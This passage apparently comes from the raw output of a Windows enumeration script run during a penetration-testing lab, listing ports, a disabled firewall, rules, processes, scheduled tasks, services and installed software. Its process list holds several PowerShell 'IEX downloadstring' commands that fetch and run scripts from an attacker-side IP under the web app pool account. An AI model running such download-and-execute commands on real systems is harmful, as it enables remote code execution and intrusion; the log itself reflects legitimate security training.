/>  UDP    0.0.0.0:3389           *:*                                    2012<br />  UDP    0.0.0.0:4500           *:*                                    696<br />  UDP    0.0.0.0:5355           *:*                                    816<br />  UDP    10.11.1.13:137         *:*                                    4<br />  UDP    10.11.1.13:138         *:*                                    4<br />  UDP    [::]:123               *:*                                    748<br />  UDP    [::]:500               *:*                                    696<br />  UDP    [::]:3389              *:*                                    2012<br />  UDP    [::]:4500              *:*                                    696<br /><br /><br />-----------------------------------------------------------<br /> Firewall Status<br />-----------------------------------------------------------<br /><br />Firewall is Disabled<br /><br />-----------------------------------------------------------<br /> FireWall Rules<br />-----------------------------------------------------------<br /><br />Name                       LocalPorts                 ApplicationName          <br />----                       ----------                 ---------------          <br />Core Networking - Packe...                                                     <br />TightVNC                                              C:\Program Files\Tight...<br />Remote Desktop - Shadow... *                          C:\Windows\system32\Rd...<br />Core Networking - Dynam... 68                         C:\Windows\system32\sv...<br />Core Networking - Dynam... 546                        C:\Windows\system32\sv...<br />Core Networking - Tered... Teredo                     C:\Windows\system32\sv...<br />FTP Server (FTP Traffic... 21                         C:\Windows\system32\sv...<br />FTP Server Passive (FTP... 1024-65535                 C:\Windows\system32\sv...<br />FTP Server Secure (FTP ... 990                        C:\Windows\system32\sv...<br />Network Discovery (LLMN... 5355                       C:\Windows\system32\sv...<br />Network Discovery (Pub-... 3702                       C:\Windows\system32\sv...<br />Network Discovery (SSDP... 1900                       C:\Windows\system32\sv...<br />Network Discovery (WSD-In) 3702                       C:\Windows\system32\sv...<br />Remote Desktop - User M... 3389                       C:\Windows\system32\sv...<br />Remote Desktop - User M... 3389                       C:\Windows\system32\sv...<br />Core Networking - Desti...                            System                   <br />Core Networking - Desti...                            System                   <br />Core Networking - Inter...                            System                   <br />Core Networking - IPHTT... IPHTTPS                    System                   <br />Core Networking - IPv6 ...                            System                   <br />Core Networking - Multi...                            System                   <br />Core Networking - Multi...                            System                   <br />Core Networking - Multi...                            System                   <br />Core Networking - Multi...                            System                   <br />Core Networking - Neigh...                            System                   <br />Core Networking - Neigh...                            System                   <br />Core Networking - Param...                            System                   <br />Core Networking - Route...                            System                   <br />Core Networking - Route...                            System                   <br />Core Networking - Time ...                            System                   <br />Network Discovery (NB-D... 138                        System                   <br />Network Discovery (NB-N... 137                        System                   <br />Network Discovery (UPnP... 2869                       System                   <br />Network Discovery (WSD ... 5357                       System                   <br />Network Discovery (WSD ... 5358                       System                   <br />Windows Remote Manageme... 5985                       System                   <br />Windows Remote Manageme... 5985                       System                   <br />World Wide Web Services... 80                         System                   <br />World Wide Web Services... 443                        System                   <br />Core Networking - Multi...                                                     <br />Core Networking - Multi...                                                     <br />Core Networking - Multi...                                                     <br />Core Networking - Multi...                                                     <br />Core Networking - Neigh...                                                     <br />Core Networking - Neigh...                                                     <br />Core Networking - Packe...                                                     <br />Core Networking - Param...                                                     <br />Core Networking - Route...                                                     <br />Core Networking - Route...                                                     <br />Core Networking - Time ...                                                     <br />Core Networking - Group... *                          C:\Windows\system32\ls...<br />Core Networking - DNS (... *                          C:\Windows\system32\sv...<br />Core Networking - Dynam... 68                         C:\Windows\system32\sv...<br />Core Networking - Dynam... 546                        C:\Windows\system32\sv...<br />Core Networking - Group... *                          C:\Windows\system32\sv...<br />Core Networking - IPHTT... *                          C:\Windows\system32\sv...<br />Core Networking - Tered... *                          C:\Windows\system32\sv...<br />FTP Server (FTP Traffic... 20                         C:\Windows\system32\sv...<br />FTP Server Secure (FTP ... 989                        C:\Windows\system32\sv...<br />Network Discovery (LLMN... *                          C:\Windows\system32\sv...<br />Network Discovery (Pub ... *                          C:\Windows\system32\sv...<br />Network Discovery (SSDP... *                          C:\Windows\system32\sv...<br />Network Discovery (UPnP... *                          C:\Windows\system32\sv...<br />Network Discovery (WSD-... *                          C:\Windows\system32\sv...<br />Core Networking - Group... *                          System                   <br />Core Networking - Inter...                            System                   <br />Core Networking - IPv6 ...                            System                   <br />Network Discovery (NB-D... *                          System                   <br />Network Discovery (NB-N... *                          System                   <br />Network Discovery (UPnP... *                          System                   <br />Network Discovery (WSD ... *                          System                   <br />Network Discovery (WSD ... *                          System                   <br /><br /><br />-----------------------------------------------------------<br /> Hosts File Content<br />-----------------------------------------------------------<br /><br /># Copyright (c) 1993-2009 Microsoft Corp.<br />#<br /># This is a sample HOSTS file used by Microsoft TCP/IP for Windows.<br />#<br /># This file contains the mappings of IP addresses to host names. Each<br /># entry should be kept on an individual line. The IP address should<br /># be placed in the first column followed by the corresponding host name.<br /># The IP address and the host name should be separated by at least one<br /># space.<br />#<br /># Additionally, comments (such as these) may be inserted on individual<br /># lines or following the machine name denoted by a &#39;#&#39; symbol.<br />#<br /># For example:<br />#<br />#      102.54.94.97     rhino.acme.com          # source server<br />#       38.25.63.10     x.acme.com              # x client host<br /><br /># localhost name resolution is handled within DNS itself.<br />#	127.0.0.1       localhost<br />#	::1             localhost<br /><br /><br />-----------------------------------------------------------<br /> Processes<br />-----------------------------------------------------------<br /><br />Name                ProcessID Owner          CommandLine                       <br />----                --------- -----          -----------                       <br />cmd.exe                  1916 DefaultAppPool &quot;cmd.exe&quot; /c powershell.exe       <br />                                             &quot;IEX(new-object net.webclient).dow<br />                                             nloadstring(&#39;http://192.168.119.16<br />                                             7:80/je.ps1&#39;)&quot;                    <br />cmd.exe                  1492 DefaultAppPool &quot;cmd.exe&quot; /c powershell.exe       <br />                                             &quot;IEX(new-object net.webclient).dow<br />                                             nloadstring(&#39;http://192.168.119.16<br />                                             7:80/3232.ps1&#39;)&quot;                  <br />cmd.exe                  1476 DefaultAppPool &quot;cmd.exe&quot; /c powershell.exe       <br />                                             &quot;IEX(new-object net.webclient).dow<br />                                             nloadstring(&#39;http://192.168.119.16<br />                                             7:80/3232.ps1&#39;)&quot;                  <br />conhost.exe              1688 DefaultAppPool \??\C:\Windows\system32\conhost.ex<br />                                             e 0x4                             <br />conhost.exe              1640 DefaultAppPool \??\C:\Windows\system32\conhost.ex<br />                                             e 0x4                             <br />conhost.exe              2576 DefaultAppPool \??\C:\Windows\system32\conhost.ex<br />                                             e 0x4                             <br />csrss.exe                 304                                                  <br />csrss.exe                 356                                                  <br />dllhost.exe              2068                                                  <br />dwm.exe                   644                                                  <br />LogonUI.exe              2428                                                  <br />lsass.exe                 460                                                  <br />msdtc.exe                2208                                                  <br />net.exe                  2368 DefaultAppPool &quot;C:\Windows\system32\net.exe&quot;     <br />                                             use \\1nsider                     <br />powershell.exe           2656 DefaultAppPool powershell.exe  &quot;IEX(new-object ne<br />                                             t.webclient).downloadstring(&#39;http:<br />                                             //192.168.119.167:80/3232.ps1&#39;)&quot;  <br />powershell.exe           1852 DefaultAppPool powershell.exe  &quot;IEX(new-object ne<br />                                             t.webclient).downloadstring(&#39;http:<br />                                             //192.168.119.167:80/je.ps1&#39;)&quot;    <br />powershell.exe           1124 DefaultAppPool powershell.exe  &quot;IEX(new-object ne<br />                                             t.webclient).downloadstring(&#39;http:<br />                                             //192.168.119.167:80/3232.ps1&#39;)&quot;  <br />services.exe              452                                                  <br />smss.exe                  212                                                  <br />spoolsv.exe               352                                                  <br />sqlservr.exe              496                                                  <br />sqlwriter.exe            1156                                                  <br />svchost.exe               928                                                  <br />svchost.exe               816                                                  <br />svchost.exe               528                                                  <br />svchost.exe               280                                                  <br />svchost.exe               748                                                  <br />svchost.exe               544                                                  <br />svchost.exe               516                                                  <br />svchost.exe               696                                                  <br />svchost.exe               656                                                  <br />svchost.exe               588                                                  <br />svchost.exe              1172                                                  <br />svchost.exe              1380                                                  <br />svchost.exe              2040                                                  <br />svchost.exe              2012                                                  <br />System                      4                                                  <br />System Idle Process         0                                                  <br />tvnserver.exe            1196                                                  <br />VGAuthService.exe        1268                                                  <br />vmtoolsd.exe             1364                                                  <br />w3wp.exe                 1716 DefaultAppPool c:\windows\system32\inetsrv\w3wp.e<br />                                             xe -ap &quot;DefaultAppPool&quot; -v &quot;v4.0&quot; <br />                                             -l &quot;webengine4.dll&quot; -a \\.\pipe\ii<br />                                             sipm5659c1ec-b10a-44d6-ba7a-c73867<br />                                             aa9805 -h &quot;C:\inetpub\temp\apppool<br />                                             s\DefaultAppPool\DefaultAppPool.co<br />                                             nfig&quot; -w &quot;&quot; -m 0 -t 20 -ta 0      <br />wininit.exe               384                                                  <br />winlogon.exe              392                                                  <br />WmiApSrv.exe             1628                                                  <br />WmiPrvSE.exe             1808                                                  <br /><br /><br /><br />-----------------------------------------------------------<br /> Scheduled Tasks<br />-----------------------------------------------------------<br />Current System Time: 04/27/2020 13:20:02<br /><br />TaskName    : \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 <br />              64<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 <br />              64 Critical<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 <br />              Critical<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\Active Directory Rights Management Services <br />              Client\AD RMS Rights Policy Template Management (Automated)<br />Run As User : Everyone<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\Active Directory Rights Management Services <br />              Client\AD RMS Rights Policy Template Management (Automated)<br />Run As User : Everyone<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\Active Directory Rights Management Services <br />              Client\AD RMS Rights Policy Template Management (Manual)<br />Run As User : Everyone<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\AppID\SmartScreenSpecific<br />Run As User : INTERACTIVE<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\Application Experience\ProgramDataUpdater<br />Run As User : SYSTEM<br />Task To Run : %windir%\system32\rundll32.exe <br />              %windir%\system32\invagent.dll,RunUpdate<br /><br />TaskName    : \Microsoft\Windows\Autochk\Proxy<br />Run As User : SYSTEM<br />Task To Run : %windir%\system32\rundll32.exe /d <br />              acproxy.dll,PerformAutochkOperations<br /><br />TaskName    : \Microsoft\Windows\Chkdsk\ProactiveScan<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\Customer Experience Improvement <br />              Program\Consolidator<br />Run As User : SYSTEM<br />Task To Run : %SystemRoot%\System32\wsqmcons.exe <br /><br />TaskName    : \Microsoft\Windows\Customer Experience Improvement <br />              Program\KernelCeipTask<br />Run As User : LOCAL SERVICE<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\Customer Experience Improvement <br />              Program\UsbCeip<br />Run As User : Administrators<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\Customer Experience Improvement <br />              Program\Server\ServerCeipAssistant<br />Run As User : SYSTEM<br />Task To Run : %windir%\system32\ceipdata.exe -id 1<br /><br />TaskName    : \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan for <br />              Crash Recovery<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\Defrag\ScheduledDefrag<br />Run As User : SYSTEM<br />Task To Run : %windir%\system32\defrag.exe -c -h -k -g -$<br /><br />TaskName    : \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents<br />Run As User : Administrators<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents<br />Run As User : Administrators<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents<br />Run As User : Administrators<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents<br />Run As User : Administrators<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\MemoryDiagnostic\RunFullMemoryDiagnostic<br />Run As User : Administrators<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\MUI\LPRemove<br />Run As User : SYSTEM<br />Task To Run : %windir%\system32\lpremove.exe <br /><br />TaskName    : \Microsoft\Windows\Multimedia\SystemSoundsService<br />Run As User : Users<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\NetCfg\BindingWorkItemQueueHandler<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\NetTrace\GatherNetworkInfo<br />Run As User : Users<br />Task To Run : %windir%\system32\gatherNetworkInfo.vbs <br /><br />TaskName    : \Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\RAC\RacTask<br />Run As User : LOCAL SERVICE<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\RAC\RacTask<br />Run As User : LOCAL SERVICE<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\RAC\RacTask<br />Run As User : LOCAL SERVICE<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\Server Manager\CleanupOldPerfLogs<br />Run As User : SYSTEM<br />Task To Run : %systemroot%\system32\cscript.exe /B /nologo <br />              %systemroot%\system32\calluxxprovider.vbs $(Arg0) $(Arg1) $(Arg2)<br /><br />TaskName    : \Microsoft\Windows\Server Manager\ServerManager<br />Run As User : Administrators<br />Task To Run : %windir%\system32\ServerManagerLauncher.exe <br /><br />TaskName    : \Microsoft\Windows\Servicing\StartComponentCleanup<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\Software Inventory Logging\Collection<br />Run As User : SYSTEM<br />Task To Run : %systemroot%\system32\cmd.exe /d /c <br />              %systemroot%\system32\silcollector.cmd publish<br /><br />TaskName    : \Microsoft\Windows\Software Inventory Logging\Configuration<br />Run As User : SYSTEM<br />Task To Run : %systemroot%\system32\cmd.exe /d /c <br />              %systemroot%\system32\silcollector.cmd configure<br /><br />TaskName    : \Microsoft\Windows\Storage Tiers Management\Storage Tiers <br />              Management Initialization<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\Storage Tiers Management\Storage Tiers <br />              Optimization<br />Run As User : SYSTEM<br />Task To Run : %windir%\system32\defrag.exe -c -h -g -#<br /><br />TaskName    : \Microsoft\Windows\TaskScheduler\Idle Maintenance<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\TaskScheduler\Manual Maintenance<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\TaskScheduler\Regular Maintenance<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\TextServicesFramework\MsCtfMonitor<br />Run As User : Users<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\Time Synchronization\SynchronizeTime<br />Run As User : LOCAL SERVICE<br />Task To Run : %windir%\system32\sc.exe start w32time task_started<br /><br />TaskName    : \Microsoft\Windows\Time Zone\SynchronizeTimeZone<br />Run As User : SYSTEM<br />Task To Run : %windir%\system32\tzsync.exe <br /><br />TaskName    : \Microsoft\Windows\Windows Error Reporting\QueueReporting<br />Run As User : Users<br />Task To Run : %windir%\system32\wermgr.exe -queuereporting<br /><br />TaskName    : \Microsoft\Windows\Windows Error Reporting\QueueReporting<br />Run As User : Users<br />Task To Run : %windir%\system32\wermgr.exe -queuereporting<br /><br />TaskName    : \Microsoft\Windows\Windows Filtering <br />              Platform\BfeOnServiceStartTypeChange<br />Run As User : SYSTEM<br />Task To Run : %windir%\system32\rundll32.exe <br />              bfe.dll,BfeOnServiceStartTypeChange<br /><br />TaskName    : \Microsoft\Windows\WindowsColorSystem\Calibration Loader<br />Run As User : Users<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\WindowsColorSystem\Calibration Loader<br />Run As User : Users<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\WindowsUpdate\AUFirmwareInstall<br />Run As User : LOCAL SERVICE<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\WindowsUpdate\AUScheduledInstall<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\WindowsUpdate\AUSessionConnect<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\WindowsUpdate\AUSessionConnect<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\WindowsUpdate\AUSessionConnect<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\WindowsUpdate\AUSessionConnect<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\WindowsUpdate\AUSessionConnect<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start<br />Run As User : SYSTEM<br />Task To Run : C:\Windows\system32\sc.exe start wuauserv<br /><br />TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start<br />Run As User : SYSTEM<br />Task To Run : C:\Windows\system32\sc.exe start wuauserv<br /><br />TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start<br />Run As User : SYSTEM<br />Task To Run : C:\Windows\system32\sc.exe start wuauserv<br /><br />TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start<br />Run As User : SYSTEM<br />Task To Run : C:\Windows\system32\sc.exe start wuauserv<br /><br />TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start With Network<br />Run As User : SYSTEM<br />Task To Run : C:\Windows\system32\sc.exe start wuauserv<br /><br />TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start With Network<br />Run As User : SYSTEM<br />Task To Run : C:\Windows\system32\sc.exe start wuauserv<br /><br />TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start With Network<br />Run As User : SYSTEM<br />Task To Run : C:\Windows\system32\sc.exe start wuauserv<br /><br />TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start With Network<br />Run As User : SYSTEM<br />Task To Run : C:\Windows\system32\sc.exe start wuauserv<br /><br />TaskName    : \Microsoft\Windows\Wininet\CacheTask<br />Run As User : Users<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\Workplace Join\Automatic-Workplace-Join<br />Run As User : Authenticated Users<br />Task To Run : %SystemRoot%\System32\AutoWorkplace.exe join<br /><br />TaskName    : \Microsoft\Windows\WS\License Validation<br />Run As User : LOCAL SERVICE<br />Task To Run : rundll32.exe WSClient.dll,WSpTLR licensing<br /><br />TaskName    : \Microsoft\Windows\WS\WSTask<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br /><br /><br /><br />-----------------------------------------------------------<br /> Services<br />-----------------------------------------------------------<br /><br />Name                         DisplayName                                             Status<br />----                         -----------                                             ------<br />smphost                      Microsoft Storage Spaces SMP                           Stopped<br />SNMPTRAP                     SNMP Trap                                              Stopped<br />sppsvc                       Software Protection                                    Stopped<br />ShellHWDetection             Shell Hardware Detection                               Stopped<br />SCPolicySvc                  Smart Card Removal Policy                              Stopped<br />seclogon                     Secondary Logon                                        Stopped<br />SharedAccess                 Internet Connection Sharing (ICS)                      Stopped<br />swprv                        Microsoft Software Shadow Copy Provider                Stopped<br />SysMain                      Superfetch                                             Stopped<br />TapiSrv                      Telephony                                              Stopped<br />svsvc                        Spot Verifier                                          Stopped<br />SQLAgent$SQLEXPRESS          SQL Server Agent (SQLEXPRESS)                          Stopped<br />SQLBrowser                   SQL Server Browser                                     Stopped<br />SstpSvc                      Secure Socket Tunneling Protocol Service               Stopped<br />ScDeviceEnum                 Smart Card Device Enumeration Service                  Stopped<br />pla                          Performance Logs &amp; Alerts                              Stopped<br />PrintNotify                  Printer Extensions and Notifications                   Stopped<br />RasAuto                      Remote Access Auto Connection Manager                  Stopped<br />PerfHost                     Performance Counter DLL Host                           Stopped<br />NcaSvc                       Network Connectivity Assistant                         Stopped<br />Netlogon                     Netlogon                                               Stopped<br />NetTcpPortSharing            Net.Tcp Port Sharing Service                           Stopped<br />RSoPProv                     Resultant Set of Policy Provider                       Stopped<br />sacsvr                       Special Administration Console Helper                  Stopped<br />SCardSvr                     Smart Card                                             Stopped<br />RpcLocator                   Remote Procedure Call (RPC) Locator                    Stopped<br />RasMan                       Remote Access Connection Manager                       Stopped<br />RemoteAccess                 Routing and Remote Access                              Stopped<br />RemoteRegistry               Remote Registry                                        Stopped<br />WdiServiceHost               Diagnostic Service Host                                Stopped<br />WdiSystemHost                Diagnostic System Host                                 Stopped<br />Wecsvc                       Windows Event Collector                                Stopped<br />WcsPlugInService             Windows Color System                                   Stopped<br />VMwareCAFManagementAgentHost VMware CAF Management Agent Service                    Stopped<br />VSS                          Volume Shadow Copy                                     Stopped<br />w3logsvc                     W3C Logging Service                                    Stopped<br />WSService                    Windows Store Service (WSService)                      Stopped<br />wuauserv                     Windows Update                                         Stopped<br />wudfsvc                      Windows Driver Foundation - User-mode Driver Framework Stopped<br />WPDBusEnum                   Portable Device Enumerator Service                     Stopped<br />WEPHOSTSVC                   Windows Encryption Provider Host Service               Stopped<br />wercplsupport                Problem Reports and Solutions Control Panel Support    Stopped<br />WerSvc                       Windows Error Reporting Service                        Stopped<br />VMwareCAFCommAmqpListener    VMware CAF AMQP Communication Service                  Stopped<br />VaultSvc                     Credential Manager                                     Stopped<br />vds                          Virtual Disk                                           Stopped<br />vmicguestinterface           Hyper-V Guest Service Interface                        Stopped<br />UI0Detect                    Interactive Services Detection                         Stopped<br />THREADORDER                  Thread Ordering Server                                 Stopped<br />TieringEngineService         Storage Tiers Management                               Stopped<br />TrustedInstaller             Windows Modules Installer                              Stopped<br />vmictimesync                 Hyper-V Time Synchronization Service                   Stopped<br />vmicvss                      Hyper-V Volume Shadow Copy Requestor                   Stopped<br />vmvss                        VMware Snapshot Provider                               Stopped<br />vmicshutdown                 Hyper-V Guest Shutdown Service                         Stopped<br />vmicheartbeat                Hyper-V Heartbeat Service                              Stopped<br />vmickvpexchange              Hyper-V Data Exchange Service                          Stopped<br />vmicrdv                      Hyper-V Remote Desktop Virtualization Service          Stopped<br />Eaphost                      Extensible Authentication Protocol                     Stopped<br />EFS                          Encrypting File System (EFS)                           Stopped<br />fdPHost                      Function Discovery Provider Host                       Stopped<br />DeviceAssociationService     Device Association Service                             Stopped<br />DeviceInstall                Device Install Service                                 Stopped<br />dot3svc                      Wired AutoConfig                                       Stopped<br />hkmsvc                       Health Key and Certificate Management                  Stopped<br />IEEtwCollectorService        Internet Explorer ETW Collector Service                Stopped<br />KPSSVC                       KDC Proxy Server service (KPS)                         Stopped<br />FDResPub                     Function Discovery Resource Publication                Stopped<br />FontCache3.0.0.0             Windows Presentation Foundation Font Cache 3.0.0.0     Stopped<br />hidserv                      Human Interface Device Service                         Stopped<br />Appinfo                      Application Information                                Stopped<br />AppMgmt                      Application Management                                 Stopped<br />AppReadiness                 App Readiness                                          Stopped<br />AeLookupSvc                  Application Experience                                 Stopped<br />ALG                          Application Layer Gateway Service                      Stopped<br />AppIDSvc                     Application Identity                                   Stopped<br />Audiosrv                     Windows Audio                                          Stopped<br />Browser                      Computer Browser                                       Stopped<br />defragsvc                    Optimize drives                                        Stopped<br />AppXSvc                      AppX Deployment Service (AppXSVC)                      Stopped<br />aspnet_state                 ASP.NET State Service                                  Stopped<br />AudioEndpointBuilder         Windows Audio Endpoint Builder                         Stopped<br />msiserver                    Windows Installer                                      Stopped<br />KtmRm                        KtmRm for Distributed Transaction Coordinator          Stopped<br />MSiSCSI                      Microsoft iSCSI Initiator Service                      Stopped<br />MMCSS                        Multimedia Class Scheduler                             Stopped<br />lltdsvc                      Link-Layer Topology Discovery Mapper                   Stopped<br />napagent                     Network Access Protection Agent                        Stopped<br />CertPropSvc                  Certificate Propagation                                Running<br />BrokerInfrastructure         Background Tasks Infrastructure Service                Running<br />PolicyAgent                  IPsec Policy Agent                                     Running<br />BFE                          Base Filtering Engine                                  Running<br />W3SVC                        World Wide Web Publishing Service                      Running<br />BITS                         Background Intelligent Transfer Service                Running<br />W32Time                      Windows Time                                           Running<br />Power                        Power                                                  Running<br />MpsSvc                       Windows Firewall                                       Running<br />ProfSvc                      User Profile Service                                   Running<br />DcomLaunch                   DCOM Server Process Launcher                           Running<br />VMTools                      VMware Tools                                           Running<br />COMSysApp                    COM+ System Application                                Running<br />CryptSvc                     Cryptographic Services                                 Running<br />WinHttpAutoProxySvc          WinHTTP Web Proxy Auto-Discovery Service               Running<br />netprofm                     Network List Service                                   Running<br />AppHostSvc                   Application Host Helper Service                        Running<br />Winmgmt                      Windows Management Instrumentation                     Running<br />wmiApSrv                     WMI Performance Adapter                                Running<br />WinRM                        Windows Remote Management (WS-Management)              Running<br />Netman                       Network Connections                                    Running<br />NlaSvc                       Network Location Awareness                             Running<br />SamSs                        Security Accounts Manager                              Running<br />Wcmsvc                       Windows Connection Manager                             Running<br />WAS                          Windows Process Activation Service                     Running<br />PlugPlay                     Plug and Play                                          Running<br />nsi                          Network Store Interface Service                        Running<br />MSSQL$SQLEXPRESS             SQL Server (SQLEXPRESS)                                Running<br />MSDTC                        Distributed Transaction Coordinator                    Running<br />Dhcp                         DHCP Client                                            Running<br />ftpsvc                       Microsoft FTP Service                                  Running<br />Spooler                      Print Spooler                                          Running<br />gpsvc                        Group Policy Client                                    Running<br />LanmanWorkstation            Workstation                                            Running<br />RpcEptMapper                 RPC Endpoint Mapper                                    Running<br />SQLWriter                    SQL Server VSS Writer                                  Running<br />FontCache                    Windows Font Cache Service                             Running<br />RpcSs                        Remote Procedure Call (RPC)                            Running<br />iphlpsvc                     IP Helper                                              Running<br />Schedule                     Task Scheduler                                         Running<br />KeyIso                       CNG Key Isolation                                      Running<br />IKEEXT                       IKE and AuthIP IPsec Keying Modules                    Running<br />LanmanServer                 Server                                                 Running<br />SessionEnv                   Remote Desktop Configuration                           Running<br />SENS                         System Event Notification Service                      Running<br />EventSystem                  COM+ Event System                                      Running<br />UALSVC                       User Access Logging Service                            Running<br />tvnserver                    TightVNC Server                                        Running<br />DPS                          Diagnostic Policy Service                              Running<br />UmRdpService                 Remote Desktop Services UserMode Port Redirector       Running<br />VGAuthService                VMware Alias Manager and Ticket Service                Running<br />DiagTrack                    Diagnostics Tracking Service                           Running<br />Dnscache                     DNS Client                                             Running<br />TrkWks                       Distributed Link Tracking Client                       Running<br />lmhosts                      TCP/IP NetBIOS Helper                                  Running<br />SystemEventsBroker           System Events Broker                                   Running<br />EventLog                     Windows Event Log                                      Running<br />TermService                  Remote Desktop Services                                Running<br />DsmSvc                       Device Setup Manager                                   Running<br />LSM                          Local Session Manager                                  Running<br />Themes                       Themes                                                 Running<br /><br /><br /><br /><br />-----------------------------------------------------------<br /> Installed Programs<br />-----------------------------------------------------------<br /><br />SQL Server Browser for SQL Server 2012                         11.0.2100.60     SQL Server Browser for SQL Server 2012                        <br />VMware Tools                                                   10.3.10.12406962 VMware Tools                                                  <br />Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219    10.0.40219       Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219   <br />Microsoft Visual C++ 2017 x86 Additional Runtime - 14.12.25810 14.12.25810      Microsoft Visual C++ 2017 x86 Additional Runtime - 14.12.25810<br />Microsoft Visual C++ 2010  x86 Redistributable - 10.0.40219    10.0.40219       Microsoft Visual C++ 2010  x86 Redistributable - 10.0.40219   <br />Microsoft SQL Server 2012 Native Client                        11.0.2100.60     Microsoft SQL Server 2012 Native Client                       <br />TightVNC                                                       2.8.11.0         TightVNC                                                      <br />Microsoft Visual C++ 2017 x64 Additional Runtime - 14.12.25810 14.12.25810      Microsoft Visual C++ 2017 x64 Additional Runtime - 14.12.25810<br />Microsoft SQL Server 2012 RsFx Driver                          11.0.2100.60     Microsoft SQL Server 2012 RsFx Driver                         <br />Microsoft SQL Server 2012 Transact-SQL ScriptDom               11.0.2100.60     Microsoft SQL Server 2012 Transact-SQL ScriptDom              <br />SQL Server 2012 Common Files                                   11.0.2100.60     SQL Server 2012 Common Files                                  <br />SQL Server 2012 Database Engine Services                       11.0.2100.60     SQL Server 2012 Database Engine Services                      <br />Microsoft SQL Server 2008 Setup Support Files                  10.1.2731.0      Microsoft SQL Server 2008 Setup Support Files                 <br />SQL Server 2012 Database Engine Shared                         11.0.2100.60     SQL Server 2012 Database Engine Shared                        <br />Microsoft Visual C++ 2017 x86 Minimum Runtime - 14.12.25810    14.12.25810      Microsoft Visual C++ 2017 x86 Minimum Runtime - 14.12.25810   <br />SQL Server 2012 Database Engine Services                       11.0.2100.60     SQL Server 2012 Database Engine Services                      <br />Microsoft Visual C++ 2017 x64 Minimum Runtime - 14.12.25810    14.12.25810      Microsoft Visual C++ 2017 x64 Minimum Runtime - 14.12.25810   <br />Sql Server Customer Experience Improvement Program             11.0.2100.60     Sql Server Customer Experience Improvement Program            <br />SQL Server 2012 Database Engine Shared                         11.0.2100.60     SQL Server 2012 Database Engine Shared                        <br />SQL Server 2012 Common Files                                   11.0.2100.60     SQL Server 2012 Common Files                                  <br />Microsoft SQL Server 2012 Setup (English)                      11.1.3128.0      Microsoft SQL Server 2012 Setup (English)                     <br />Microsoft VSS Writer for SQL 